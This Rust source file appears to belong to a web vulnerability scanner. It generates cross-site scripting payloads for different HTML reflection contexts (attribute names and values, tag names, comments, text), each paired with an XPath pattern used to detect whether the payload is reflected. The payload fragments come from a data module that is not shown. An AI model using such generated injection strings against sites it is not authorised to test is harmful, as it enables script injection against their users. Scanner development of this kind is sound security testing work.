use crate::data;
use crate::htmlparser::{xpath_for_fragment, HtmlMatch};
use crate::utils::random_str;

fn rand_char() -> String {
    random_str(1).to_lowercase()
}

fn spaces(n: usize) -> String {
    " ".repeat(n)
}

/// Port of the Python `XSS_PAYLOADS` generator: produces
/// (payload, xpath-style search pattern) pairs per reflection context.
pub struct XssPayloads {
    pub payloads: Vec<String>,
}

impl XssPayloads {
    pub fn new(payloads: Vec<String>) -> Self {
        XssPayloads { payloads }
    }

    pub fn attrname(&self) -> Vec<(String, String)> {
        let mut payloads = Vec::new();
        for attr in data::xss_attr() {
            for js_cmd in data::js_value() {
                for js_func in data::js_func() {
                    for space in 1..5 {
                        let random_txt = rand_char();
                        let payload = format!(
                            "{random_txt}{space}{attr}={js_func}({js_cmd}){space}{random_txt}",
                            space = spaces(space)
                        );
                        let search = format!("//*[@{attr}=\"{js_func}({js_cmd})\"]");
                        payloads.push((payload, search));

                        let random_txt = rand_char();
                        let payload = format!(
                            "{random_txt}{space}{attr}={js_func}`{random_txt}`{space}{random_txt}",
                            space = spaces(space)
                        );
                        let search = format!("//*[@{attr}=\"{js_func}`{random_txt}`\"]");
                        payloads.push((payload, search));
                    }
                }
            }
        }
        payloads
    }

    pub fn attrvalue(&self) -> Vec<(String, String)> {
        let mut payloads = Vec::new();
        let mut payloads_with_payloads = Vec::new();
        for js_cmd in data::js_value() {
            for js_func in data::js_func() {
                payloads_with_payloads.push(format!("{js_func}({js_cmd})"));
                payloads_with_payloads.push(format!("{js_func}`{}`", rand_char()));
            }
        }
        for current in &payloads_with_payloads {
            for attr in data::xss_attr() {
                for space in 1..5 {
                    let random_txt = rand_char();
                    let payload = format!(
                        "{random_txt}{space}{attr}={current}{space}{random_txt}",
                        space = spaces(space)
                    );
                    let search = format!("//*[@{attr}=\"{current}\"]");
                    payloads.push((payload, search));
                }
            }
        }
        payloads
    }

    pub fn tagname(&self) -> Vec<(String, String)> {
        let mut payloads = Vec::new();
        for attr in data::xss_attr() {
            for js_cmd in data::js_value() {
                for js_func in data::js_func() {
                    for space in 1..5 {
                        let payload = format!(
                            "{}{} {attr}={js_func}({js_cmd}){}",
                            rand_char(),
                            spaces(space),
                            spaces(space)
                        );
                        let search = format!("//*[@{attr}=\"{js_func}({js_cmd})\"]");
                        payloads.push((payload, search));

                        let payload = format!(
                            "{}{} {attr}={js_func}`{js_cmd}`{}",
                            rand_char(),
                            spaces(space),
                            spaces(space)
                        );
                        let search = format!("//*[@{attr}=\"{js_func}`{js_cmd}`\"]");
                        payloads.push((payload, search));
                    }
                }
            }
        }
        payloads
    }

    pub fn txt(&self, before_payload: &str) -> Vec<(String, String)> {
        let mut payloads = Vec::new();
        for tag in data::xss_tags() {
            if !tag.contains("$JS_FUNC$") && !tag.contains("$JS_CMD$") {
                let payload = format!("{before_payload}{tag}");
                let xpath = xpath_for_fragment(&payload);
                payloads.push((payload, xpath));
            } else {
                for js_func in data::js_func() {
                    for js_cmd in data::js_value() {
                        let new_tag =
                            tag.replace("$JS_CMD$", js_cmd).replace("$JS_FUNC$", js_func);
                        let payload = format!("{before_payload}{new_tag}");
                        let xpath = xpath_for_fragment(&payload);
                        payloads.push((payload, xpath));
                    }
                }
            }
        }
        payloads
    }

    pub fn generate(&self, payload: &str, location: HtmlMatch) -> Vec<(String, String)> {
        tracing::debug!("Generating payloads for {payload}");
        tracing::debug!("Location: {location:?}");
        match location {
            HtmlMatch::AttrName => self.attrname(),
            HtmlMatch::TagName => self.tagname(),
            HtmlMatch::AttrValue => self.attrvalue(),
            HtmlMatch::Comment => self.txt("-->"),
            _ => self.txt(payload),
        }
    }
}
